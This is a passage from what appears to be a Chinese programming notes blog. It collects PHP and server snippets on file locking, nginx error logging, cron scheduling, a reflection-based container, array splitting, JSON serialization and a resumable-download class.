class="number">-1</span>, <span class="number">0</span>) = <span class="number">0x7f0434160000</span></span><br><span class="line">access(<span class="string">"/etc/ld.so.preload"</span>, R_OK)      = <span class="number">-1</span> ENOENT (No such file or directory)</span><br><span class="line">open(<span class="string">"/etc/ld.so.cache"</span>, O_RDONLY)      = <span class="number">3</span></span><br><span class="line">fstat(<span class="number">3</span>, &#123;st_mode=S_IFREG|<span class="number">0644</span>, st_size=<span class="number">53434</span>, ...&#125;) = <span class="number">0</span></span><br><span class="line">mmap(NULL, <span class="number">53434</span>, PROT_READ, MAP_PRIVATE, <span class="number">3</span>, <span class="number">0</span>) = <span class="number">0x7f0434152000</span></span><br><span class="line">close(<span class="number">3</span>)                                = <span class="number">0</span></span><br><span class="line">open(<span class="string">"/lib64/libc.so.6"</span>, O_RDONLY)      = <span class="number">3</span></span><br></pre></td></tr></table></figure>
<h3 id="PHP文件锁机制"><a href="#PHP文件锁机制" class="headerlink" title="PHP文件锁机制"></a>PHP文件锁机制</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取指针</span></span><br><span class="line">$file = <span class="string">'lock/increase.txt'</span>;</span><br><span class="line">$fp = fopen($file, <span class="string">'r'</span>);</span><br><span class="line"><span class="comment">//加排他锁</span></span><br><span class="line">flock($fp, LOCK_EX);</span><br><span class="line"><span class="comment">//数据操作</span></span><br><span class="line">$key = <span class="string">'company_watch_num_'</span> . $request[<span class="string">'company_id'</span>];</span><br><span class="line">Cache::increment($key);</span><br><span class="line"><span class="comment">//解锁</span></span><br><span class="line">flock($fp, LOCK_UN);</span><br><span class="line"><span class="comment">//关闭指针</span></span><br><span class="line">fclose($fp);</span><br></pre></td></tr></table></figure>
<h3 id="关闭错误日志"><a href="#关闭错误日志" class="headerlink" title="关闭错误日志"></a>关闭错误日志</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">，通过 error_log off 并不能关闭错误日志记录，而它只是表示将日志文件写入一个文件名为 off 的文件中。</span><br><span class="line"></span><br><span class="line">如果需要关闭错误日志记录，应使用以下配置：</span><br><span class="line"></span><br><span class="line">error_log /dev/null crit;                  # 把存储位置设置为linux的黑洞</span><br></pre></td></tr></table></figure>
<h3 id="php实现多进程"><a href="#php实现多进程" class="headerlink" title="php实现多进程"></a>php实现多进程</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">producer.php</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">echo microtime(<span class="literal">true</span>).<span class="string">'&lt;br&gt;'</span>;</span><br><span class="line"></span><br><span class="line">$url = <span class="string">'http://localhost/consumer.php'</span>;</span><br><span class="line">$curl = curl_init();</span><br><span class="line">curl_setopt($curl, CURLOPT_URL, $url);</span><br><span class="line">curl_setopt($curl, CURLOPT_HEADER, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">curl_setopt($curl, CURLOPT_NOSIGNAL, <span class="number">1</span>);</span><br><span class="line">curl_setopt($curl, CURLOPT_TIMEOUT_MS, <span class="number">200</span>); <span class="comment">//超时等待时间为200ms</span></span><br><span class="line"></span><br><span class="line">curl_setopt($curl, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">$data = curl_exec($curl);</span><br><span class="line">curl_close($curl);</span><br><span class="line"></span><br><span class="line">echo microtime(<span class="literal">true</span>);</span><br><span class="line">consumer.php</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">ignore_user_abort(<span class="literal">true</span>); <span class="comment">//客户端断开链接后，php脚本继续运行. 这行代码可能有点多余，但是无法准确的证明，所以先留着</span></span><br><span class="line">set_time_limit(<span class="number">0</span>); <span class="comment">//保证程序长时间运行不中断 http://eienao.com/posts/use-php-to-achieve-a-multi-process-ideas.html</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">	file_put_contents(<span class="string">'./date'</span>, time());</span><br><span class="line">	sleep(<span class="number">2</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="反射机制实现"><a href="#反射机制实现" class="headerlink" title="反射机制实现"></a>反射机制实现</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">http:<span class="comment">//eienao.com/posts/a-brief-introduction-to-the-realization-of-container-reflection-mechanism.html</span></span><br><span class="line">namespace Container;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Container</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    public <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">make</span>(<span class="params">$class</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $reflection = <span class="keyword">new</span> \ReflectionClass($<span class="class"><span class="keyword">class</span>)</span>;</span><br><span class="line"></span><br><span class="line">        $<span class="keyword">constructor</span> = $reflection-&gt;getConstructor();</span><br><span class="line">        $parameters = $<span class="keyword">constructor</span>-&gt;getParameters();</span><br><span class="line"></span><br><span class="line">        $instances = [];</span><br><span class="line"></span><br><span class="line">        foreach ($parameters as $parameter) &#123;</span><br><span class="line">            $className =  $parameter-&gt;getClass()-&gt;getName();</span><br><span class="line">            $instances[] = <span class="keyword">new</span> $className;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//... 将数组拆封成参数传递给方法, 类似于 call_user_func_array()</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> $<span class="class"><span class="keyword">class</span>(...$<span class="title">instances</span>)</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">namespace Container\Foo;</span><br><span class="line"></span><br><span class="line">use Container\Bar\BarA;</span><br><span class="line">use Container\Bar\BarB;</span><br><span class="line">use Container\Bar\BarC;</span><br><span class="line">use Container\Bar\BarD;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Foo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    private $barA;</span><br><span class="line">    private $barB;</span><br><span class="line">    private $barC;</span><br><span class="line">    private $barD;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">BarA $barA, BarB $barB, BarC $barC, BarD $barD</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        $<span class="keyword">this</span>-&gt;barA = $barA;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;barB = $barB;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;barC = $barC;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;barD = $barD;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">allBarName</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $<span class="keyword">this</span>-&gt;barA-&gt;name().<span class="string">'/'</span>.$<span class="keyword">this</span>-&gt;barB-&gt;name().<span class="string">'/'</span>.$<span class="keyword">this</span>-&gt;barC-&gt;name().<span class="string">'/'</span>.$<span class="keyword">this</span>-&gt;barD-&gt;name();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">namespace Container\Bar;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BarA</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">name</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'彼得·帕克'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$foo = \Container\Container::make(\Container\Foo\Foo::<span class="class"><span class="keyword">class</span>)</span>;</span><br><span class="line">echo $foo-&gt;allBarName(); <span class="comment">// 彼得·帕克/托尼·屎大颗/巴里·艾伦/布鲁斯·韦恩  https://github.com/weiwenhao/container</span></span><br><span class="line">$foo = <span class="keyword">new</span> \Container\Foo\Foo(</span><br><span class="line">    <span class="keyword">new</span> \Container\Bar\BarA(),</span><br><span class="line">    <span class="keyword">new</span> \Container\Bar\BarB(),</span><br><span class="line">    <span class="keyword">new</span> \Container\Bar\BarC(),</span><br><span class="line">    <span class="keyword">new</span> \Container\Bar\BarD()</span><br><span class="line">);</span><br><span class="line">echo $foo-&gt;allBarName();</span><br></pre></td></tr></table></figure>
<h3 id="cron"><a href="#cron" class="headerlink" title="cron"></a>cron</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">设定每个脚本最多执行时间位 <span class="number">200</span>秒，超过 <span class="number">200</span>秒 就自动死掉。https:<span class="comment">//learnku.com/articles/25177</span></span><br><span class="line"></span><br><span class="line">* * * * * timeout <span class="number">200</span> php /home/app/email.php</span><br><span class="line">如果这个脚本执行时间超过 <span class="number">60</span>秒，下一分钟又会执行 php email.php，如果避免重复执行？</span><br><span class="line">* * * * * flock -xn /tmp/test.lock -c <span class="string">"timeout 200 php /home/app/email.php"</span></span><br><span class="line"></span><br><span class="line">想 <span class="number">10</span>s 执行一次怎么办？</span><br><span class="line"></span><br><span class="line">* * * * * php /home/app/email.php &gt;&gt; <span class="regexp">/home/</span>log/test.log <span class="number">2</span>&gt;&amp;<span class="number">1</span></span><br><span class="line">* * * * * ( sleep <span class="number">10</span> ; php /home/app/email.php &gt;&gt; <span class="regexp">/home/</span>log/test.log <span class="number">2</span>&gt;&amp;<span class="number">1</span> )</span><br><span class="line">* * * * * ( sleep <span class="number">20</span> ; php /home/app/email.php &gt;&gt; <span class="regexp">/home/</span>log/test.log <span class="number">2</span>&gt;&amp;<span class="number">1</span> )</span><br><span class="line">* * * * * ( sleep <span class="number">30</span> ; php /home/app/email.php &gt;&gt; <span class="regexp">/home/</span>log/test.log <span class="number">2</span>&gt;&amp;<span class="number">1</span> )</span><br><span class="line">* * * * * ( sleep <span class="number">40</span> ; php /home/app/email.php &gt;&gt; <span class="regexp">/home/</span>log/test.log <span class="number">2</span>&gt;&amp;<span class="number">1</span> )</span><br><span class="line">* * * * * ( sleep <span class="number">50</span> ; php /home/app/email.php &gt;&gt; <span class="regexp">/home/</span>log/test.log <span class="number">2</span>&gt;&amp;<span class="number">1</span> )c</span><br><span class="line">cat test.php</span><br><span class="line">$i = <span class="number">10000</span>;</span><br><span class="line"><span class="keyword">while</span> ($i &gt; <span class="number">0</span>) &#123;</span><br><span class="line">  echo --$i . \PHP_EOL;</span><br><span class="line">  sleep(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="分割数组"><a href="#分割数组" class="headerlink" title="分割数组"></a>分割数组</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//源数据</span></span><br><span class="line">$origin =[];</span><br><span class="line"><span class="comment">//当前本地数据</span></span><br><span class="line">$current=[];</span><br><span class="line"><span class="comment">//生成10000个数据</span></span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">1</span>;$i&lt;<span class="number">10000</span>;$i++) &#123;</span><br><span class="line">    $origin[] =  [<span class="string">'id'</span> =&gt; $i, <span class="string">'title'</span> =&gt; <span class="string">'title'</span>.$i, <span class="string">'content'</span> =&gt; <span class="string">'name'</span>.$i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//假设本地的数据已经取好了，我用title来作为唯一值来处理吧，容易认一点</span></span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">5000</span>;$i&lt;<span class="number">8000</span>;$i++) &#123;</span><br><span class="line">    $current[] = <span class="string">'title'</span>.$i;</span><br><span class="line">&#125;</span><br><span class="line">$t1 = microtime(<span class="literal">true</span>);</span><br><span class="line">$insertArr = [];</span><br><span class="line">$updateArr = [];</span><br><span class="line">foreach ($origin <span class="keyword">as</span> $k=&gt;$value) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!in_array($value[<span class="string">'title'</span>], $current)) &#123;</span><br><span class="line">        $insertArr[] = $value;</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        $updateArr[] = $value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$t2 = microtime(<span class="literal">true</span>);</span><br><span class="line">dd($t2 - $t1);</span><br><span class="line"></span><br><span class="line">$t1 = microtime(<span class="literal">true</span>);</span><br><span class="line">array_walk($origin, <span class="function"><span class="keyword">function</span>(<span class="params">$value</span>) <span class="title">use</span> (<span class="params">$current, &amp;$insertArr, &amp;$updateArr</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!in_array($value[<span class="string">'title'</span>], $current)) &#123;</span><br><span class="line">        $insertArr[] = $value;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $updateArr[] = $value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line">或者</span><br><span class="line">array_map(<span class="function"><span class="keyword">function</span>(<span class="params">$value</span>) <span class="title">use</span> (<span class="params">$current, &amp;$insertArr, &amp;$updateArr</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!in_array($value[<span class="string">'title'</span>], $current)) &#123;</span><br><span class="line">        $insertArr[] = $value;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $updateArr[] = $value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;, $origin);</span><br><span class="line">$t2 = microtime(<span class="literal">true</span>);</span><br><span class="line">dd($t2 - $t1);</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 对比法分割数组https://learnku.com/articles/25250 </span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @param $key    通过指定键（key）去对比</span></span><br><span class="line"><span class="comment"> * @param $origin 原数组</span></span><br><span class="line"><span class="comment"> * @param $split 分割数组 （源数组中的某个键的值）</span></span><br><span class="line"><span class="comment"> * @return array ['split'=&gt;被分割出来的数组, 'remainders'=&gt;剩余的数据];</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">splitArr</span>(<span class="params">$key, $origin, $split</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//把title取出来做为键</span></span><br><span class="line">    $origin_new = array_combine(array_column($origin, $key), $origin);</span><br><span class="line">    <span class="comment">//把值作为键</span></span><br><span class="line">    $split_flip = array_flip($split);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//剩余的源数据 （用键来做差集比较得剩余的源数据）</span></span><br><span class="line">    $remainders = array_diff_key($origin_new, $split_flip);</span><br><span class="line">    <span class="comment">//被分割出来的数据</span></span><br><span class="line">    $new_split = array_diff_key($origin_new, $remainders);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> [<span class="string">'split'</span>=&gt;$new_split, <span class="string">'remainders'</span>=&gt;$remainders];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="json-encode-如何转化一个对象"><a href="#json-encode-如何转化一个对象" class="headerlink" title="json_encode()如何转化一个对象"></a>json_encode()如何转化一个对象</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//https://blog.yiranzai.cn/posts/26855/</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">JsonTest</span> <span class="title">implements</span> <span class="title">JsonSerializable</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    public <span class="keyword">const</span> TEST = <span class="string">'c'</span>;</span><br><span class="line">    public $a = <span class="string">'a'</span>;</span><br><span class="line">    public <span class="keyword">static</span> $b = <span class="string">'b'</span>;</span><br><span class="line">    protected $e = <span class="string">'e'</span>;</span><br><span class="line">    private $d = <span class="string">'d'</span>;</span><br><span class="line"></span><br><span class="line">    protected <span class="function"><span class="keyword">function</span> <span class="title">test1</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> __FUNCTION__;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private <span class="function"><span class="keyword">function</span> <span class="title">test2</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> __FUNCTION__;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">test3</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> __FUNCTION__;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">test4</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> __FUNCTION__;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">jsonSerialize</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $json = array();</span><br><span class="line">        foreach ($<span class="keyword">this</span> <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">            $json[$key] = $value;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $json;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">echo json_encode(<span class="keyword">new</span> JsonTest());<span class="comment">//&#123; "a": "a", "e": "e", "d": "d" &#125;</span></span><br><span class="line">&gt;&gt;&gt; $a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>];</span><br><span class="line"> </span><br><span class="line">&gt;&gt;&gt; json_encode($a);</span><br><span class="line">=&gt; <span class="string">"[1,2,3,4]"</span></span><br><span class="line">&gt;&gt;&gt; json_encode((object)$a);</span><br><span class="line">=&gt; <span class="string">"&#123;"</span><span class="number">0</span><span class="string">":1,"</span><span class="number">1</span><span class="string">":2,"</span><span class="number">2</span><span class="string">":3,"</span><span class="number">3</span><span class="string">":4&#125;"</span></span><br><span class="line">&gt;&gt;&gt; json_encode($a,JSON_FORCE_OBJECT);</span><br><span class="line">=&gt; <span class="string">"&#123;"</span><span class="number">0</span><span class="string">":1,"</span><span class="number">1</span><span class="string">":2,"</span><span class="number">2</span><span class="string">":3,"</span><span class="number">3</span><span class="string">":4&#125;"</span></span><br><span class="line">&gt;&gt;&gt; json_encode($a,JSON_FORCE_OBJECT|JSON_PRETTY_PRINT);</span><br><span class="line">=&gt; <span class="string">""</span><span class="string">"</span></span><br><span class="line"><span class="string">   &#123;\n</span></span><br><span class="line"><span class="string">       "</span><span class="number">0</span><span class="string">": 1,\n</span></span><br><span class="line"><span class="string">       "</span><span class="number">1</span><span class="string">": 2,\n</span></span><br><span class="line"><span class="string">       "</span><span class="number">2</span><span class="string">": 3,\n</span></span><br><span class="line"><span class="string">       "</span><span class="number">3</span><span class="string">": 4\n</span></span><br><span class="line"><span class="string">   &#125;</span></span><br><span class="line"><span class="string">   "</span><span class="string">""</span></span><br></pre></td></tr></table></figure>
<h3 id="断点续传"><a href="#断点续传" class="headerlink" title="断点续传"></a>断点续传</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileDownload</span></span>&#123; <span class="comment">// class start  </span></span><br><span class="line">    private $_speed = <span class="number">512</span>;   <span class="comment">// 下载速度  </span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/** 下载</span></span><br><span class="line"><span class="comment">     * @param String  $file   要下载的文件路径</span></span><br><span class="line"><span class="comment">     * @param String  $name   文件名称,为空则与下载的文件名称一样</span></span><br><span class="line"><span class="comment">     * @param boolean $reload 是否开启断点续传</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">download</span>(<span class="params">$file, $name=<span class="string">''</span>, $reload=false</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(file_exists($file))&#123;</span><br><span class="line">            <span class="keyword">if</span>($name==<span class="string">''</span>)&#123;</span><br><span class="line">                $name = basename($file);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $fp = fopen($file, <span class="string">'rb'</span>);</span><br><span class="line">            $file_size = filesize($file);</span><br><span class="line"></span><br><span class="line">            $ranges = $<span class="keyword">this</span>-&gt;getRange($file_size);</span><br><span class="line"></span><br><span class="line">            header(<span class="string">'cache-control:public'</span>);</span><br><span class="line">            header(<span class="string">'content-type:application/octet-stream'</span>);</span><br><span class="line">            header(<span class="string">'content-disposition:attachment; filename='</span>.$name);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($reload &amp;&amp; $ranges!=<span class="literal">null</span>)&#123; <span class="comment">// 使用续传  </span></span><br><span class="line">                header(<span class="string">'HTTP/1.1 206 Partial Content'</span>);</span><br><span class="line">                header(<span class="string">'Accept-Ranges:bytes'</span>);</span><br><span class="line">                <span class="comment">// 剩余长度  </span></span><br><span class="line">                header(sprintf(<span class="string">'content-length:%u'</span>,$ranges[<span class="string">'end'</span>]-$ranges[<span class="string">'start'</span>]));</span><br><span class="line">                <span class="comment">// range信息  </span></span><br><span class="line">                header(sprintf(<span class="string">'content-range:bytes %s-%s/%s'</span>, $ranges[<span class="string">'start'</span>], 